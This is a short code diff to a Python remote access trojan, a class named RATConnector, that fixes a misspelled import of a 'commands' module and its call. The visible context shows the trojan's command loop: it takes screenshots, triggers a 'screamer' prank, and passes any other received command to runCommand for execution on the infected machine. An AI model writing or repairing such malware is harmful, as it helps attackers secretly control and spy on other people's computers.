@@ -8,7 +8,7 @@ import ctypes
 import sys
 import pyautogui
 import PIL
-import comands
+import commands
 
 
 class RATConnector:
@@ -134,7 +134,7 @@ class RATConnector:
                 elif command[0] == "screenshot":
                     commandResponse = self.screen_handler()
                 elif command[0] == "screamer":
-                    commandResponse = comands.screamer()
+                    commandResponse = commands.screamer()
                 else:
                     convCommand = self.arrayToString(command)
                     commandResponse = self.runCommand(convCommand).decode()
